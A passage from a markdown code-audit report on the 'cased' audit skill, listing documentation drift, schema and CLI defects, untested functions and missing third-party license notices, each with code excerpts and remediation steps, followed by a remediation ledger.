    node --test test/build-report.test.mjs test/recon-to-yaml.test.mjs test/eval-score.test.mjs test/eval-score-reaudit.test.mjs test/compare-runs.test.mjs test/prior-audits.test.mjs test/gates.test.mjs
```

Related: [CI's bundle gates abort](#ci-drift-gates-abort-without-ys), [Four render/escape exports have no tests](#untested-render-and-escape-exports).

**Remediation:** Replace the enumeration with a glob — `node --test test/*.test.mjs` — so a new file can never fall off the list; then confirm the count rises by 29 and fix whatever the newly-run suite reports.

<div>&hairsp;</div>

### AGENTS.md briefs agents on a directory, a recipe, and a platform that no longer exist {#agents-md-stale-after-prelaunch-cleanup}

**moderate** · `AGENTS.md:19`, `AGENTS.md:43-47`, `AGENTS.md:60` · effort: trivial · <img src="assets/sparkline-agents-md-stale-after-prelaunch-cleanup.svg" height="14" alt="commit activity" />

Three statements in the file every agent reads first were invalidated by the pre-launch cleanup without being updated: `just build-example` does not exist (replaced by `build-smoke` in a22aa0c); `example/` is present on this working tree but untracked, so a fresh clone has no such directory; and "cased runs on Claude Code, Codex, and Gemini" contradicts README.md, evals/README.md and 505eb92 ("drop unverified Gemini shim"). By this project's own rule that documentation wins over code, two documents now assert opposite things about the same capability.

```markdown AGENTS.md:43-47
just test            # node --test (build-report, recon, eval scorer)
just check-bundle    # rebuild viewer bundle, fail on drift
just check-contract  # restamp schema contract, fail on drift (needs ys: cargo install yaml-schema)
just build-example   # full pipeline against example/ data
just eval <fixture>  # live audit eval — real tokens, minutes; not for CI
```

Related: [CI's bundle gates abort](#ci-drift-gates-abort-without-ys), [README undersells crustoleum](#readme-crustoleum-counts-and-agent-table-stale).

**Remediation:** Replace the `example/` row and the `build-example` line with `build-smoke`; commit or delete `example/`; change the platform line to "Claude Code and Codex; Gemini is unsupported until an adapter and eval verification exist".

<div>&hairsp;</div>

### README tells readers to press S for slide mode; the viewer binds P {#readme-slide-mode-wrong-key}

**moderate** · `README.md:137`, `src/viewer/slides.js:15-17` · effort: trivial · <img src="assets/sparkline-readme-slide-mode-wrong-key.svg" height="14" alt="commit activity" />

`slides.js` registers exactly one mode-toggle binding, on `p`. Pressing S in a rendered report does nothing. Slide mode is the one advertised feature whose invocation the reader cannot discover from the page, and README is the only document naming a key.

```markdown README.md:137
- **Slide mode** — press S to present findings one at a time
```

**Remediation:** Change README.md:137 to P, or change `slides.js:16` to `s` and rebuild the bundle.

<div>&hairsp;</div>

### `finalize` claims to run every gate but skips the ledger's commit checks {#finalize-skips-ledger-commit-verification}

**moderate** · `src/viewer/build-report.mjs:831-836`, `src/viewer/gates.mjs:123-129` · effort: small · <img src="assets/sparkline-finalize-skips-ledger-commit-verification.svg" height="14" alt="commit activity" />

The CLI advertises `finalize` as "run every gate" and SKILL.md says an audit is not complete until it exits 0. But `finalizeAudit` calls `lintLedger` without the `gitLog` argument the standalone `ledger` subcommand supplies, so everything inside `lintLedger`'s `if (gitLog)` block — including the *error*-level "commit not found in target repo" check — is dead during `finalize`. A ledger citing a hallucinated or pre-squash SHA fails `ledger` and passes `finalize`, which is the check the agent announces out loud as proof of completion.

```javascript src/viewer/build-report.mjs:831-836
    if (existsSync(ledgerPath)) {
      const problems = lintLedger({
        ledgerText: readFileSync(ledgerPath, 'utf8'),
        findingsDoc: findings,
        testCommand: recon?.testing?.command || null,
      });
```

Related: [Bare catch blocks](#bare-catch-erases-failure-cause), [Three finalizeAudit branches have no test](#finalize-gate-branches-untested).

**Remediation:** Build the same `gitLog` closure inside `finalizeAudit` (it already resolves `root`) and pass it through, so `finalize` is a true superset of `ledger`.

<div>&hairsp;</div>

### Phase 2 tells the controller to run run-tools at a path cased does not have {#crustoleum-run-tools-path-unresolvable-from-cased}

**moderate** · `skills/cased/SKILL.md:243-244` · effort: trivial · <img src="assets/sparkline-crustoleum-run-tools-path-unresolvable-from-cased.svg" height="14" alt="commit activity" />

Inside cased's SKILL.md, `${CLAUDE_SKILL_DIR}` is the cased skill directory, which has no `scripts/run-tools` — that lives in crustoleum. Followed literally, step 2 of the domain-skill path resolves to nothing, so the cargo tooling that feeds the Supply Chain, Safety and Performance surfaces never runs. Step 5 of the same list gets this right ("resolve from the base directory reported when the crustoleum skill is loaded"); step 2 is the one cross-skill path left unqualified.

```markdown skills/cased/SKILL.md:243-244
1. Load the skill (`skill: crustoleum`) to get the full rubric.
2. Run the skill's tool prerequisites (e.g., `${CLAUDE_SKILL_DIR}/scripts/run-tools --full`).
```

**Remediation:** Rewrite step 2 the way step 5 does; never use `${CLAUDE_SKILL_DIR}` for a path outside the cased skill.

<div>&hairsp;</div>

### Codex adapter says the default thread cap matches the agent count; it is one short {#codex-max-threads-undercounts-agents}

**moderate** · `skills/cased/references/codex-tools.md:47-50` · effort: trivial · <img src="assets/sparkline-codex-max-threads-undercounts-agents.svg" height="14" alt="commit activity" />

Both dispatch paths can reach seven concurrent agents — four always plus three conditionals, or crustoleum's six plus cased's completeness — and the adapter hides it by writing "api-design/performance" as one slot. Since this file's purpose is preventing Phase 2 from silently degrading on Codex, telling the operator to leave a cap of 6 is the one instruction that can reintroduce the failure it exists to prevent. The pseudocode below it also lists six calls and omits performance.

```markdown skills/cased/references/codex-tools.md:47-50
The `agents.max_threads` default is 6, which matches the cased agent
count exactly (security, error-handling, code-quality, completeness,
dependencies, api-design/performance). Leave the default unless an
audit requires more surfaces.
```

**Remediation:** Correct the count to seven, tell the operator to raise `agents.max_threads` to at least 7, and add performance to the pseudocode.

<div>&hairsp;</div>

### README undersells crustoleum and omits the Completeness agent from its roster {#readme-crustoleum-counts-and-agent-table-stale}

**advisory** · `README.md:45-56`, `README.md:181` · effort: trivial · <img src="assets/sparkline-readme-crustoleum-counts-and-agent-table-stale.svg" height="14" alt="commit activity" />

crustoleum ships fourteen surfaces and eighty-nine criteria — its own SKILL.md, its README, and cased's SKILL.md all agree — and only cased's README still carries the pre-merge 13/84 figures, in both places it quotes them. Separately, the "Without a domain skill" table lists six agents while SKILL.md dispatches Completeness on every audit.

```markdown README.md:181
| Rust | [crustoleum](https://github.com/claylo/crustoleum) | 13 surfaces, 84 criteria, cargo tooling (clippy, audit, deny, geiger, miri, sanitizers) |
```

**Remediation:** Update both figures to 14/89 and add a Completeness row.

<div>&hairsp;</div>

### The install command README leads with has nothing in the repo backing it {#readme-primary-install-path-unverified}

**advisory** · `README.md:69-72` · effort: trivial · <img src="assets/sparkline-readme-primary-install-path-unverified.svg" height="14" alt="commit activity" />

The first install path a reader tries — `npx @anthropic-ai/claude-code-skill install claylo/cased` — has nothing in the repository that would make it work: no `package.json` name, no `.claude-plugin/`, no `plugin.json`, no marketplace entry. The manual clone-and-symlink path below it is what the rest of the project is built around. Whether the npm package resolves the argument could not be verified offline; what is verifiable is that this repo publishes nothing such a command could resolve.

```markdown README.md:69-72
Cased is a Claude Code skill — a prompt-and-script package that Claude Code loads on demand.

```sh
npx @anthropic-ai/claude-code-skill install claylo/cased
```

**Remediation:** Run the command against a clean machine before publishing; if it does not resolve, lead with the manual block and drop the npx line, or add the packaging metadata that makes it real.

*The two significant findings are the ones that matter for launch credibility — a project whose pitch is mechanical gates ships with its bundle-drift gate dead in CI and 29 tests unreachable. Both are one-line fixes. The documentation drift is the ordinary residue of a fast August and should be swept before the release post.*

---

## The API Design Surface

*The contract is coherent where the schema enforces it and drifts where it does not — open objects, write-only fields, author-supplied counts, and a ledger parser that accepts a field it cannot read.*

### Subagent contract mandates `criterion` and `surface`; the findings schema defines neither {#contract-fields-absent-from-schema}

**moderate** · `skills/cased/agents/api-design.md:90-91`, `skills/cased/references/subagent-output-contract.md:86-87`, `src/schemas/findings.schema.json:51-55` · effort: small · <img src="assets/sparkline-contract-fields-absent-from-schema.svg" height="14" alt="commit activity" />

Every analysis rubric and the shared output contract instruct subagents to emit `criterion` and `surface` on every finding, and the contract says `surface` "maps to the narrative title". Neither field exists in `findings.schema.json`, the example, the schema doc, or SKILL.md. They survive `validate` only because the finding object is open, and nothing reads them, so the promised surface-to-narrative mapping is never checked. Two of the contract's own fields are write-only. This audit is a live example: every agent emitted both and the controller stripped them during assembly because the schema has nowhere to keep them.

```markdown skills/cased/references/subagent-output-contract.md:86-87
    criterion: "<YOUR_PREFIX>-N"         # e.g. SEC-1, CQ-3 — see your rubric
    surface: "<Your Surface Name>"       # maps to the narrative title
```

Enabled by [findings.schema.json leaves objects open](#findings-schema-accepts-unknown-keys).

**Remediation:** Pick one direction and make the whole contract agree — add both fields to the schema, example and doc and have the controller assert `surface` equals the narrative title; or drop them from the contract and all seven rubrics.

<div>&hairsp;</div>

### findings.schema.json leaves 11 of 14 objects open while recon.schema.json locks 15 of 16 {#findings-schema-accepts-unknown-keys}

**moderate** · `src/schemas/recon.schema.json:1-13`, `src/schemas/findings.schema.json:12-17`, `src/schemas/findings.schema.json:111-115` · effort: medium · <img src="assets/sparkline-findings-schema-accepts-unknown-keys.svg" height="14" alt="commit activity" />

The two halves of the same contract apply opposite strictness policies. Recon — machine-generated — is locked at every level but one; findings — authored by an LLM — is open at eleven of fourteen, exactly backwards for where typos happen. A misspelled optional key silently degrades behaviour instead of failing validation: `orign:` drops the finding out of `finalizeAudit`'s causal check and the eval's `origin_coverage`; `failure-mode:` falls into `isBlocking`'s `?? 'user-visible'` default, silently promoting a finding onto the release-gating list. `validate` reports ok in every case.

```json src/schemas/findings.schema.json:12-17
    "narratives": {
      "type": "array",
      "items": {
        "type": "object",
        "required": ["slug", "title", "thesis", "verdict", "findings"],
        "properties": {
```

Enables [criterion and surface are write-only](#contract-fields-absent-from-schema). Related: [summary.counts never cross-checked](#summary-counts-never-cross-checked).

**Remediation:** Add `additionalProperties: false` to the remaining objects (and to recon's `skill_versions`), then re-validate the example and every audit under `record/audits/` to surface fields in use that the schema never declared.

<div>&hairsp;</div>

### summary.counts is author-supplied and never reconciled with the findings it describes {#summary-counts-never-cross-checked}

**moderate** · `src/viewer/build-report.mjs:348-353`, `src/schemas/findings.schema.json:134-141` · effort: small · <img src="assets/sparkline-summary-counts-never-cross-checked.svg" height="14" alt="commit activity" />

`summary.counts` is a model-authored tally the schema requires but never relates to `narratives[].findings[]`, and no gate closes the loop. `renderHeader` prints those numbers while, on the same line, `blockingCounts()` derives blocking/backlog from the real findings — so a miscount renders a report that contradicts itself and `finalize` still exits 0. The asymmetry against `lintLedger`, which enforces exactly this arithmetic for `actions-taken.md`, is stark. The controller miscounted this very audit's summary by hand twice before catching it.

```javascript src/viewer/build-report.mjs:348-353
export function renderHeader(findings) {
  const counts = findings.summary?.counts || {};
  const total = Object.values(counts).reduce((a, b) => a + b, 0);
  const assessment = findings.assessment || '';
  const { blocking, backlog } = blockingCounts(findings);
  const glossary = buildGlossary(counts, blocking, backlog);
```

**Remediation:** Add a `checkSummaryCounts` gate that recomputes the histogram from `allFindings` and errors on mismatch, called from `finalizeAudit` — or drop `summary.counts` from the schema and derive it, since the field carries no information the findings do not.

<div>&hairsp;</div>

### A ledger entry whose Addresses field omits link syntax lints clean and records no slugs {#ledger-addresses-silently-parses-nothing}

**moderate** · `skills/cased/references/actions-taken-schema.md:41`, `src/viewer/prior-audits.mjs:30`, `src/viewer/gates.mjs:98-100` · effort: trivial · <img src="assets/sparkline-ledger-addresses-silently-parses-nothing.svg" height="14" alt="commit activity" />

`parseLedger` extracts slugs from `Addresses` only via `matchAll(/\[([^\]]+)\]/g)` — the markdown brackets are load-bearing — but the schema doc presents them as a linking convention. `lintLedger` checks only that the field is non-empty and then iterates an empty list, so `**Addresses:** silent-write-discard` passes `ledger` with zero errors while addressing nothing: `latestDispositions` records no disposition and every `scoreRemediation` count reads empty. The one gate that exists to keep remediation honest reports "ledger ok" on a ledger that tracks nothing.

```javascript src/viewer/prior-audits.mjs:30
    const addresses = [...(fields.Addresses ?? '').matchAll(/\[([^\]]+)\]/g)].map(m => m[1]);
```

Related: [Disposition vocabulary triplicated](#disposition-vocabulary-triplicated).

**Remediation:** Error when `Addresses` is present but no slugs parsed, and state in the schema doc that the bracket form is what the linter parses.

<div>&hairsp;</div>

### An unrecognised build-report subcommand becomes the audit directory, and `build` validates nothing {#build-report-subcommand-fallback}

**moderate** · `src/viewer/build-report.mjs:941-953`, `src/viewer/build-report.mjs:1006-1016` · effort: small · <img src="assets/sparkline-build-report-subcommand-fallback.svg" height="14" alt="commit activity" />

The bare-`<dir>` back-compat path means the parser can never reject a subcommand: `build-report.js validte record/audits/x` runs `build` against a directory named `validte`, and because `build` never checks its argument, the first symptom is an unhandled `ENOENT` naming a path the user never typed. Unknown `--flags` are filtered away silently. Exit codes are ad hoc in the same region — 1 for a missing ledger, 2 for a missing findings.yaml five lines later — and the usage text documents no contract at all, unlike `recon` and `score-eval`.

```javascript src/viewer/build-report.mjs:945-953
      const rawArgs = process.argv.slice(2);
      const SUBCOMMANDS = ['build', 'validate', 'evidence', 'ledger', 'finalize'];
      const positional = rawArgs.filter(a => !a.startsWith('--'));
      let subcommand = 'build';
      let auditDir = positional[0];
      if (SUBCOMMANDS.includes(positional[0])) {
        subcommand = positional[0];
        auditDir = positional[1];
      }
```

Related: [Shipped help names source paths](#shipped-help-names-source-paths), [build reads inputs unguarded](#build-subcommand-unguarded-io).

**Remediation:** Reject an unrecognised first positional that is not an existing directory; guard `build`'s inputs like the other four; error on unknown flags; document 1/2 exit codes in the usage block.

<div>&hairsp;</div>

### run-eval records --effort in the run slug and provenance but never applies it on the claude platform {#run-eval-effort-ignored-on-claude}

**moderate** · `evals/scripts/run-eval:67-69`, `evals/scripts/run-eval:140-144` · effort: trivial · <img src="assets/sparkline-run-eval-effort-ignored-on-claude.svg" height="14" alt="commit activity" />

`--effort` is parsed for every platform but consumed only by the codex branch. On claude it is silently dropped from the command while still flowing into the run slug, `run-meta.yaml`, and `compare-runs`' label — contradicting the file's own header ("provenance is never self-reported"), because the recorded provenance is not what ran. Two runs at `--effort high` and `low` are identically configured sessions filed under different labels, and the matrix then attributes run-to-run variance to an axis that was never set.

```bash evals/scripts/run-eval:140-144
case "$PLATFORM" in
  claude)
    CMD=(claude -p "$PROMPT" --output-format text --permission-mode acceptEdits --allowedTools "$ALLOWED_TOOLS")
    [[ "$MODEL" != "default" ]] && CMD+=(--model "$MODEL")
    ;;
```

**Remediation:** Reject the combination in the `claude)` branch, or map it to a real knob; recorded `effort:` must only ever name a setting that was applied.

<div>&hairsp;</div>

### Shipped CLI help text names source-tree paths that do not exist in an installed skill {#shipped-help-names-source-paths}

**advisory** · `src/recon/recon:7-8`, `src/viewer/build-report.mjs:956` · effort: trivial · <img src="assets/sparkline-shipped-help-names-source-paths.svg" height="14" alt="commit activity" />

Both files are stamped verbatim into the shipped skill, so the help a user sees names `src/recon/recon` and `build-report.mjs` — paths from a repo they do not have. `recon-to-yaml.mjs` gets this right, printing its own basename.

```bash src/recon/recon:7-8
# Usage:
#   bash src/recon/recon <target-project-dir> <audit-dir>
```

**Remediation:** Print the invoked name (`basename(process.argv[1])`, `$0`) rather than a hardcoded path, and re-run `just check-bundle`.

<div>&hairsp;</div>

### The eight-value disposition vocabulary is hardcoded in three places with no single source {#disposition-vocabulary-triplicated}

**advisory** · `src/viewer/gates.mjs:73-74`, `src/viewer/gates.mjs:90`, `src/viewer/prior-audits.mjs:9` · effort: small · <img src="assets/sparkline-disposition-vocabulary-triplicated.svg" height="14" alt="commit activity" />

The identical eight-element list is written out three times in code, again in prose, and as a partial `REQUIRE_COMMIT` and a subset enum in the schema. Each copy feeds a different gate, and drift is silent in both directions: a value in `KNOWN` but not `DISPOSITIONS` lints clean yet never registers a disposition; miss the inline copy and every ledger using the new value fails the arithmetic with a misleading message. This vocabulary has already grown twice.

```javascript src/viewer/prior-audits.mjs:9
const DISPOSITIONS = ['fixed', 'mitigated', 'accepted', 'disputed', 'deferred', 'escalated', 'superseded', 'no-measurable-benefit'];
```

**Remediation:** Define it once in a small shared module (avoiding the gates → prior-audits import cycle), derive the rest, and add a test that the code list matches the documented dispositions.

*Nothing is broken today because every producer is the same author's model prompts, but the contract is the product: a third party writing findings.yaml or actions-taken.md gets no error for `criterion`, for a miscounted `summary`, or for an `Addresses` line without link syntax. Tightening the schema and cross-checking counts at build time closes most of it.*

---

## The Code Quality Surface

*A 1,100-line renderer grown by surgical edits: the logic is sound and well-tested at the function level, but the CLI tail, two template renderers, and four flatten helpers are copy-and-diverge waiting to happen.*

### build-report.mjs ends in a 193-line untestable CLI closure handling five subcommands {#build-report-cli-monolith}

**moderate** · `src/viewer/build-report.mjs:940-953`, `src/viewer/build-report.mjs:1048-1059` · effort: medium · <img src="assets/sparkline-build-report-cli-monolith.svg" height="14" alt="commit activity" />

Lines 941–1133 are one anonymous async IIFE inside a `realpathSync` guard: argv parsing, five handlers, three layout searches, four conditional writes with different overwrite policies. None of it is exported, so none of it is reachable from a test — and the consequences are already visible: unknown subcommands fall through to `build`, and `--allow-unledgered-prior` is matched with `rawArgs.includes` so it silently does nothing outside `finalize`. The module as a whole does YAML parsing, ajv validation, HTML, markdown, SVG, gate orchestration and CLI in one file.

```javascript src/viewer/build-report.mjs:940-942
// CLI entry point (resolve symlinks so skill installs work)
if (realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url))) {
  (async () => {
```

Enables [Three finalizeAudit branches have no test](#finalize-gate-branches-untested). Related: [renderAgentsMd and renderReadmeMd duplicate](#agents-readme-render-duplication).

**Remediation:** Extract `parseCliArgs`, one `runX` per subcommand, and `resolveLayout`, leaving the guard as a five-line dispatcher; unit-test argument parsing and layout resolution; then split the module by responsibility.

<div>&hairsp;</div>

### renderAgentsMd and renderReadmeMd duplicate metadata assembly and a 13-key template contract {#agents-readme-render-duplication}

**moderate** · `src/viewer/build-report.mjs:696-712`, `src/viewer/build-report.mjs:741-753` · effort: small · <img src="assets/sparkline-agents-readme-render-duplication.svg" height="14" alt="commit activity" />

Two parallel implementations of the same job — interpolate audit metadata into a markdown template — sharing a byte-identical `priorList` expression and eight duplicated placeholder wirings. Drift has already happened: `renderReadmeMd` wires `{{reconciliation_table}}` and `renderAgentsMd` does not, so a reconciliation block reaches the human-facing README but never the agent-facing briefing a remediator is told to read first. The tested half is the one that did not drift.

```javascript src/viewer/build-report.mjs:709-711
  const priorList = priorAudits.length
    ? priorAudits.map(p => `- \`${p.slug}\`${p.hasLedger ? '' : ' — **no actions-taken.md** (findings there are untracked)'}`).join('\n')
    : '_none_';
```

**Remediation:** Extract a shared `auditTemplateVars()` and reduce both renderers to `interpolate(template, vars)`; add a test that every `{{…}}` placeholder in either template is present in the vars map.

<div>&hairsp;</div>

### Four exported render/escape functions on the report path have no tests {#untested-render-and-escape-exports}

**moderate** · `src/viewer/build-report.mjs:204-206`, `:217-223`, `:572-574`, `:741-742` · effort: small · <img src="assets/sparkline-untested-render-and-escape-exports.svg" height="14" alt="commit activity" />

`escHtml`, `renderProse`, `generateSparklines` and `renderReadmeMd` are never imported by any test, while the module's other twenty exports are. `renderProse` is the riskiest — a hand-rolled tokenizer whose correctness depends on interleaving an alternation regex with escaping ("Order matters", says its comment), with untested behaviour for nested markers, unbalanced backticks, `]` inside link text, and `javascript:` hrefs. The suite exercises them only transitively through `assembleReport`, which cannot distinguish "escaped correctly" from "escaped at all".

```javascript src/viewer/build-report.mjs:217-223
export function renderProse(s) {
  if (s == null) return '';
  const str = String(s);

  const tokens = [];
  let lastIndex = 0;
  const pattern = /\[([^\]]+)\]\(([^)]+)\)|\*\*([^*]+)\*\*|`([^`]+)`/g;
```

Related: [29 flow-diagram tests never run](#flow-diagram-tests-excluded-from-suite), [renderProse emits javascript: hrefs](#prose-links-allow-javascript-uris).

**Remediation:** Table-driven unit tests for each: `escHtml` over `& < > "` and nullish inputs; `renderProse` over each marker type, nested and unbalanced delimiters, and raw HTML; `generateSparklines` against a temp dir; `renderReadmeMd` mirroring the existing `renderAgentsMd` test.

<div>&hairsp;</div>

### Three finalizeAudit release-gate branches have no test, including the override flag {#finalize-gate-branches-untested}

**moderate** · `src/viewer/build-report.mjs:807-819`, `src/viewer/build-report.mjs:821-828` · effort: small · <img src="assets/sparkline-finalize-gate-branches-untested.svg" height="14" alt="commit activity" />

`finalizeAudit` is the release gate and `finalize_ok` is an eval metric. Three branches are exercised by nothing: `allowUnledgeredPrior` (zero hits in `test/`, so the flag that downgrades a blocking error to a warning has never run under test in either position), the `origin.ref` belt-and-braces check that is only load-bearing when the schema's `if/then` is dropped, and the regressed-without-recurrence cross-check. Each is a conditional-only-under-failure branch — the classic place for a typo to survive.

```javascript src/viewer/build-report.mjs:814-819
    const prior = findPriorAudits(join(auditDir, '..'), basename(auditDir));
    for (const p of prior) {
      if (p.findingCount > 0 && !p.hasLedger) {
        (allowUnledgeredPrior ? warnings : errors).push(`prior audit ${p.slug} has ${p.findingCount} findings and no actions-taken.md — its findings are untracked (pass --allow-unledgered-prior to override)`);
      }
    }
```

Enabled by [The CLI monolith](#build-report-cli-monolith). Related: [finalize skips ledger commit checks](#finalize-skips-ledger-commit-verification).

**Remediation:** Three cases on the existing temp-repo helper: unledgered prior in both ternary positions; `recurrence-of` without `ref`; a `regressed` row with and without its matching finding.

<div>&hairsp;</div>

### build-viewer.sh maintains two hand-synchronised copies of the same asset list {#build-viewer-parallel-copy-lists}

**advisory** · `scripts/build-viewer.sh:18-22`, `scripts/build-viewer.sh:32-36` · effort: trivial · <img src="assets/sparkline-build-viewer-parallel-copy-lists.svg" height="14" alt="commit activity" />

Five sources copied to two destinations by two blocks kept in sync by memory. Add a sixth template to only the `build/` block and the shipped skill silently lacks it — and neither gate catches it: `check-bundle` diffs `skills/cased/`, where a never-copied file produces no diff, and `build-smoke` runs from `build/`, the branch that got the asset.

```bash scripts/build-viewer.sh:32-36
cp src/viewer/template.html         skills/cased/templates/template.html
cp src/viewer/agents-md-template.md skills/cased/templates/agents-md-template.md
cp src/viewer/readme-template.md    skills/cased/templates/readme-template.md
cp src/viewer/style.css             skills/cased/templates/style.css
cp vendor/fonts/*.woff2             skills/cased/templates/fonts/
```

**Remediation:** One `ASSETS` array and a `for dest in …` loop; have `check-bundle` assert the shipped template set matches it.

<div>&hairsp;</div>

### detectNpmTest computes the project's real test command and its caller throws it away {#detect-npm-test-command-discarded}

**note** · `src/recon/recon-to-yaml.mjs:334-342`, `src/recon/recon-to-yaml.mjs:479-483` · effort: trivial · <img src="assets/sparkline-detect-npm-test-command-discarded.svg" height="14" alt="commit activity" />

`detectNpmTest` returns `{ command: pkg.scripts.test }` and its only caller passes the literal `'npm test'` instead; the returned field has no reader. Three return shapes across four parallel detectors. Behaviour is right today, which is why this is a note — but the dead field is a standing invitation to "fix" the caller and silently change `testing.command` from a portable wrapper to a raw script.

```javascript src/recon/recon-to-yaml.mjs:334-342
  // Priority 3: package.json scripts.test
  const npmResult = detectNpmTest(targetPath);
  if (npmResult) {
    return finalizeTesting({
      command: 'npm test',
      sources: ['package.json'],
      targetPath,
    });
  }
```

**Remediation:** Return `{ source }` only, matching `detectJustTest`, with a comment saying why; settle one return-shape convention for the detector family.

<div>&hairsp;</div>

### The narratives-to-findings flatten is reimplemented four times alongside the allFindings helper {#flat-findings-traversal-reimplemented}

**note** · `src/viewer/gates.mjs:14-16`, `src/viewer/prior-audits.mjs:49`, `src/viewer/build-report.mjs:867-872`, `evals/scripts/score-eval.mjs:49-54`, `:134` · effort: trivial · <img src="assets/sparkline-flat-findings-traversal-reimplemented.svg" height="14" alt="commit activity" />

The flat walk is written out four more times beside the exported helper — twice in a file that already imports and uses it. Null-handling has already diverged (`??` vs `||`). Any future rule about which findings "count" has to be applied at five sites instead of one.

```javascript src/viewer/gates.mjs:14-16
export function allFindings(doc) {
  return (doc.narratives ?? []).flatMap(n => n.findings ?? []);
}
```

**Remediation:** Import the helper at the three sites that can; move it to a shared module (with `DISPOSITIONS`) to break the cycle for the fourth.

*Backlog, not blockers. The untested finalize branches and render/escape exports are the items with teeth — they guard the report and the release gate — and belong in the same sweep as the missing flow-to-svg tests. The duplication findings are cheap to fix now and expensive after the next feature.*

---

## The Supply Chain Surface

*No runtime dependencies ship, so the supply-chain question is not vulnerability but attribution: the bundle carries ~80 MIT/ISC/BSD packages and none of their notices.*

### Shipped skill bundles strip MIT/ISC/BSD license notices from ~80 third-party packages {#bundled-third-party-source-missing-license-notices}

**significant** · `skills/cased/scripts/build-report.js:38-40`, `skills/cased/templates/viewer.js:1-3` · effort: small · <img src="assets/sparkline-bundled-third-party-source-missing-license-notices.svg" height="14" alt="commit activity" />

`build-viewer.sh` runs rolldown to produce the two artifacts the skill ships — a 40,964-line `build-report.js` and an 823-line `viewer.js` — both committed and redistributed to every installer. The bundle carries 333 `//#region node_modules/…` markers from 81 packages: 74 MIT, 4 ISC, 3 BSD (`fast-uri`, `source-map-js`, `nth-check`). None copyleft, so compatibility is not the issue; every one of those licenses requires the notice preserved in redistributions, and BSD-3 adds a non-endorsement clause. Searching both bundles for "Permission is hereby granted" or "Copyright (c)" returns zero matches; the only survivor is a stray `mths.be/cssesc` banner. No NOTICE or THIRD-PARTY file exists anywhere in the repo. It has shipped this way since the artifact was first generated in April.

```js skills/cased/scripts/build-report.js:38-40
//#region node_modules/yaml/dist/nodes/identity.js
var require_identity = /* @__PURE__ */ __commonJSMin(((exports) => {
	const ALIAS = Symbol.for("yaml.alias");
```

**Remediation:** Generate a THIRD-PARTY-NOTICES file in `build-viewer.sh` (a license aggregator, or rolldown's legal-comments output to a separate file), ship it beside both bundles, and reference it from SKILL.md or the README.

<div>&hairsp;</div>

### run-eval shells out to claude/codex/rsync/cargo with no preflight existence check {#eval-runner-no-external-cli-preflight-check}

**moderate** · `evals/scripts/run-eval:77-78`, `src/recon/recon:36-46` · effort: trivial · <img src="assets/sparkline-eval-runner-no-external-cli-preflight-check.svg" height="14" alt="commit activity" />

`recon` establishes the project's own convention: loop over required tools with `command -v`, print an install hint, exit with a documented code. `run-eval` depends on strictly more external tools — `rsync`, `git`, `claude` or `codex`, `cargo` — and checks none of them, so a missing tool fails with bash's bare "command not found" at whatever point in a multi-minute run it is first invoked, possibly after the workdir has been staged.

```bash src/recon/recon:36-46
# Required tools
for bin in cargo git tokei node; do
  if ! command -v "$bin" >/dev/null 2>&1; then
    echo "error: required tool '$bin' not found in PATH" >&2
    case "$bin" in
      cargo) echo "  install via https://rustup.rs" >&2 ;;
      tokei) echo "  install via 'cargo install tokei'" >&2 ;;
    esac
    exit 3
  fi
done
```

**Remediation:** A preflight loop mirroring `recon`'s, checking `rsync`, `git`, `cargo`, and the tool named by `--platform`, before the rsync stage.

*One policy defect worth fixing before a public release and one ergonomics gap in the eval runner. Nothing copyleft, nothing unpinned in CI.*

---

## Remediation Ledger

| Finding | Concern | Location | Effort | Chains |
|---|---|---|---|---|
| **The Security Surface** | | | | |
| [template-slot-replace-interprets-dollar-patterns](#template-slot-replace-interprets-dollar-patterns) | significant | `src/viewer/build-report.mjs:929-935` | trivial | related: report-data-blob-script-breakout |
| [report-data-blob-script-breakout](#report-data-blob-script-breakout) | significant | `src/viewer/build-report.mjs:929-935` | small | related: unescaped-metadata, prose-links |
| [eval-scorer-shells-out-model-authored-test-command](#eval-scorer-shells-out-model-authored-test-command) | significant | `evals/scripts/score-eval.mjs:301-307` | small | enabled by: eval-runner-drives-unsandboxed |
| [unescaped-metadata-in-report-markup](#unescaped-metadata-in-report-markup) | moderate | `src/viewer/build-report.mjs:356-357` +4 | trivial | related: report-data-blob |
| [prose-links-allow-javascript-uris](#prose-links-allow-javascript-uris) | moderate | `src/viewer/build-report.mjs:223-231` | trivial | related: report-data-blob |
| [evidence-gate-reads-outside-the-repo-root](#evidence-gate-reads-outside-the-repo-root) | moderate | `src/viewer/gates.mjs:18-23` | small | related: report-data-blob |
| [eval-runner-drives-unsandboxed-headless-session](#eval-runner-drives-unsandboxed-headless-session) | moderate | `evals/scripts/run-eval:138-142` | medium | enables: eval-scorer-shells-out |
| **The Error Handling Surface** | | | | |
| [bare-catch-erases-failure-cause](#bare-catch-erases-failure-cause) | significant | `src/viewer/prior-audits.mjs:46-51` +8 | small | related: finalize-skips-ledger |
| [build-subcommand-unguarded-io](#build-subcommand-unguarded-io) | moderate | `src/viewer/build-report.mjs:857-861` | small | related: fonts-dir, subcommand-fallback |
| [fonts-dir-resolution-unguarded](#fonts-dir-resolution-unguarded) | moderate | `src/viewer/build-report.mjs:1055-1065` | trivial | related: build-subcommand-unguarded-io |
| [score-json-truncated-by-redirect](#score-json-truncated-by-redirect) | moderate | `evals/scripts/run-eval:287-290` | trivial | enabled by: entrypoint-guard |
| [hygiene-gate-swallows-git-failure](#hygiene-gate-swallows-git-failure) | moderate | `evals/scripts/run-eval:215-221` | trivial | — |
| [entrypoint-guard-unresolved-path](#entrypoint-guard-unresolved-path) | moderate | `evals/scripts/score-eval.mjs:494-496` | trivial | enables: score-json-truncated |
| [recon-catch-all-collapses-exit-3](#recon-catch-all-collapses-exit-3) | moderate | `src/recon/recon-to-yaml.mjs:703-706` | small | related: recon-exec-skips-tmp-cleanup |
| [setup-trap-deletes-only-copy](#setup-trap-deletes-only-copy) | advisory | `evals/fixtures/reaudit-rs/setup.sh:78-85` | trivial | — |
| [recon-exec-skips-tmp-cleanup](#recon-exec-skips-tmp-cleanup) | advisory | `src/recon/recon:164-165` | trivial | related: recon-catch-all |
| **The Completeness Surface** | | | | |
| [ci-drift-gates-abort-without-ys](#ci-drift-gates-abort-without-ys) | significant | `.github/workflows/ci.yaml:25-31` | trivial | related: flow-diagram-tests, agents-md-stale |
| [flow-diagram-tests-excluded-from-suite](#flow-diagram-tests-excluded-from-suite) | significant | `Justfile:66-68` | trivial | related: ci-drift-gates, untested-render |
